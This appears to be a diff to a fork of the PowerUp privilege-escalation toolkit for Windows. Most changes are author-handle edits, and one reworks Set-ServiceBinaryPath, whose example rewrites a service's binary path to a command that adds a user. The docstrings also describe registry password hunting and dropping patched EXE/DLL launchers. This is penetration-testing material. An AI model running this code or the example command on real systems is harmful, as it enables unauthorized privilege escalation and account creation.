@@ -798,7 +798,7 @@ the file paths where the current user has modification rights.
 Author: Will Schroeder (@harmj0y)  
 License: BSD 3-Clause  
 Required Dependencies: None  
-EditedBy: Tobias Neitzel (@qtc-de)
+EditedBy: Tobias Neitzel (@qtc_de)
 
 .DESCRIPTION
 
@@ -1714,21 +1714,16 @@ function Set-ServiceBinaryPath {
 
 Sets the binary path for a service to a specified value.
 
-Author: Will Schroeder (@harmj0y), Matthew Graeber (@mattifestation)  
-License: BSD 3-Clause  
-Required Dependencies: PSReflect  
+Author: Will Schroeder (@harmj0y), Matthew Graeber (@mattifestation), Tobias Neitzel (@qtc_de)
+License: BSD 3-Clause
+Required Dependencies: PSReflect
 
 .DESCRIPTION
 
-Takes a service Name or a ServiceProcess.ServiceController on the pipeline and first opens up a
+Takes a service Name or a PowerUp.Service object on the pipeline and first opens up a
 service handle to the service with ConfigControl access using the GetServiceHandle
 Win32 API call. ChangeServiceConfig is then used to set the binary path (lpBinaryPathName/binPath)
 to the string value specified by binPath, and the handle is closed off.
-
-Takes one or more ServiceProcess.ServiceController objects on the pipeline and adds a
-Dacl field to each object. It does this by opening a handle with ReadControl for the
-service with using the GetServiceHandle Win32 API call and then uses
-QueryServiceObjectSecurity to retrieve a copy of the security descriptor for the service.
 
 .PARAMETER Name
 
@@ -1750,19 +1745,12 @@ Get-Service VulnSvc | Set-ServiceBinaryPath -Path 'net user john Password123! /a
 
 Sets the binary path for 'VulnSvc' to be a command to add a user.
 
-.OUTPUTS
-
-System.Boolean
-
-$True if configuration succeeds, $False otherwise.
-
 .LINK
 
 https://msdn.microsoft.com/en-us/library/windows/desktop/ms681987(v=vs.85).aspx
 #>
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
-    [OutputType('System.Boolean')]
     [CmdletBinding()]
     Param(
         [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
@@ -1792,19 +1780,32 @@ https://msdn.microsoft.com/en-us/library/windows/desktop/ms681987(v=vs.85).aspx
             $RawHandle = $GetServiceHandle.Invoke($TargetService, @($ConfigControl))
             $RawHandle
         }
+
+        try {
+            $GetServices = [ServiceProcess.ServiceController].GetMethod('GetServices', 'public, static', $null, [type[]]@(), $null)
+            $Services = $GetServices.Invoke($null, $null)
+        } catch [System.InvalidOperationException] {
+            Write-Error "Service enumeration via ServiceController: Failed. [Access Denied]"
+            return $null
+        }
+
     }
 
     PROCESS {
 
         ForEach($IndividualService in $Name) {
 
-            $TargetService = Get-Service -Name $IndividualService -ErrorAction Stop
+            $TargetService = $Services | Where-Object { $_.Name -eq $IndividualService }
+            if( $TargetService -eq $null ) {
+                Write-Error "Specified service '$IndividualService' not found."
+            }
+
             try {
                 $ServiceHandle = Get-ServiceConfigControlHandle -TargetService $TargetService
             }
             catch {
                 $ServiceHandle = $Null
-                Write-Verbose "Error opening up the service handle with read control for $IndividualService : $_"
+                Write-Error "Error opening up the service handle with read control for $IndividualService : $_"
             }
 
             if ($ServiceHandle -and ($ServiceHandle -ne [IntPtr]::Zero)) {
@@ -1813,12 +1814,10 @@ https://msdn.microsoft.com/en-us/library/windows/desktop/ms681987(v=vs.85).aspx
                 $Result = $Advapi32::ChangeServiceConfig($ServiceHandle, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, $SERVICE_NO_CHANGE, "$Path", [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero, [IntPtr]::Zero);$LastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
 
                 if ($Result -ne 0) {
-                    Write-Verbose "binPath for $IndividualService successfully set to '$Path'"
-                    $True
+                    Write-Host "[+] binPath for $IndividualService successfully set to '$Path'"
                 }
                 else {
                     Write-Error ([ComponentModel.Win32Exception] $LastError)
-                    $Null
                 }
 
                 $Null = $Advapi32::CloseServiceHandle($ServiceHandle)
@@ -1835,7 +1834,7 @@ function Test-ServiceDaclPermission {
 Expects a set of PowerUp.Service objects as input and returns PowerUp.Service objects where the current
 user has modification permissions.
 
-Author: Tobias Neitzel (@qtc-de)
+Author: Tobias Neitzel (@qtc_de)
 License: BSD 3-Clause  
 Required Dependencies:
 
@@ -2103,7 +2102,7 @@ Enumerates services using reflection. First, the function obtains available serv
 ServiceController.GetServices function. Then, it uses QueryServiceConfig of Advapi32 to obtain additional
 service information.
 
-Author: Tobias Neitzel (@qtc-de)
+Author: Tobias Neitzel (@qtc_de)
 License: BSD 3-Clause  
 Required Dependencies: PSReflect
 
@@ -2220,7 +2219,7 @@ function Get-ServiceWmi {
 
 Enumerates services using a mix of WMI access and reflection.
 
-Author: Tobias Neitzel (@qtc-de)
+Author: Tobias Neitzel (@qtc_de)
 License: BSD 3-Clause  
 Required Dependencies: PSReflect
 
@@ -2313,7 +2312,7 @@ function Get-UnquotedService {
 Takes PowerUp.Service objects as input and returns services with unquoted image
 paths that are modifiable by the current user.
 
-Author: Tobias Neitzel (@qtc-de)
+Author: Tobias Neitzel (@qtc_de)
 License: BSD 3-Clause  
 Required Dependencies: 
 
@@ -2401,7 +2400,7 @@ function Get-ModifiableServiceFile {
 Takes PowerUp.Service objects as input and returns services with modifiable service
 files.
 
-Author: Tobias Neitzel (@qtc-de)
+Author: Tobias Neitzel (@qtc_de)
 License: BSD 3-Clause  
 Required Dependencies: 
 
@@ -2501,7 +2500,7 @@ function Show-ServicePermissions {
 
 Takes PowerUp.Service objects and transforms their access permissions in a human readable format.
 
-Author: Tobias Neitzel (@qtc-de)
+Author: Tobias Neitzel (@qtc_de)
 License: BSD 3-Clause  
 Required Dependencies: 
 
@@ -2612,7 +2611,7 @@ function Write-Exe {
 Writes a precompiled C++ executable onto the disk and patches the path to a .bat file into it.
 The corresponding .bat file is started when the executable is ran.
 
-Author: Will Schroeder (@harmj0y), Tobias Neitzel (@qtc-de)
+Author: Will Schroeder (@harmj0y), Tobias Neitzel (@qtc_de)
 License: BSD 3-Clause
 Required Dependencies: Invoke-PatchBinary
 
@@ -3430,7 +3429,7 @@ function Write-Dll {
 Writes a precompiled C++ DLL onto the disk and patches the path to a .bat file into it.
 The corresponding .bat file is started automatically, when the DLL is loaded.
 
-Author: Will Schroeder (@harmj0y), Tobias Neitzel (@qtc-de)
+Author: Will Schroeder (@harmj0y), Tobias Neitzel (@qtc_de)
 License: BSD 3-Clause
 Required Dependencies: Invoke-PatchBinary
 
@@ -3596,7 +3595,7 @@ function Get-ModifiableReg {
 Takes multiple strings containing registry paths and returns
 the registry paths where the current user has modification rights.
 
-Author: Tobias Neitzel (@qtc-de)  
+Author: Tobias Neitzel (@qtc_de)
 License: BSD 3-Clause  
 Required Dependencies: None  
 
@@ -3792,7 +3791,7 @@ function Get-ModifiableRegistryService {
 Checks for modifiable registry keys inside the HKLM:\SYSTEM\CurrentControlSet\Services\
 hive.
 
-Author: Tobias Neitzel (@qtc-de)
+Author: Tobias Neitzel (@qtc_de)
 License: BSD 3-Clause
 Required Dependencies: Get-ModifiableReg
 
@@ -3908,7 +3907,7 @@ function Get-KnownRegistryPasswords {
 
 Requests registry keys of software that is known to store credentials inside the registry.
 
-Author: Tobias Neitzel (@qtc-de)
+Author: Tobias Neitzel (@qtc_de)
 License: BSD 3-Clause
 Required Dependencies: None
 
@@ -3968,7 +3967,7 @@ function Find-RegistryString {
 
 Takes some RegistryKey objects as input and returns registry keys containing specified strings.
 
-Author: Tobias Neitzel (@qtc-de)
+Author: Tobias Neitzel (@qtc_de)
 License: BSD 3-Clause
 Required Dependencies: None
 
@@ -4056,7 +4055,7 @@ function Get-RegistryPasswords {
 
 Enumerates the HKLM:\Software hive for registry keys and values containing the text "pass" or "cred"
 
-Author: Tobias Neitzel (@qtc-de)
+Author: Tobias Neitzel (@qtc_de)
 License: BSD 3-Clause
 Required Dependencies: None
 
@@ -4333,7 +4332,7 @@ function Get-ScheduledTasks {
 
 Uses schtasks.exe to enumerate all configured scheduled tasks on the system.
 
-Author: Tobias Neitzel (@qtc-de)
+Author: Tobias Neitzel (@qtc_de)
 License: BSD 3-Clause
 Required Dependencies: None
 
@@ -4392,7 +4391,7 @@ function Get-ModifiableScheduledTaskFile2 {
 Takes an array of PowerUp.ScheduledTask objects an checks whether components of the
 executable path are modifiable by the current user.
 
-Author: Tobias Neitzel (@qtc-de)
+Author: Tobias Neitzel (@qtc_de)
 License: BSD 3-Clause
 Required Dependencies: None
 
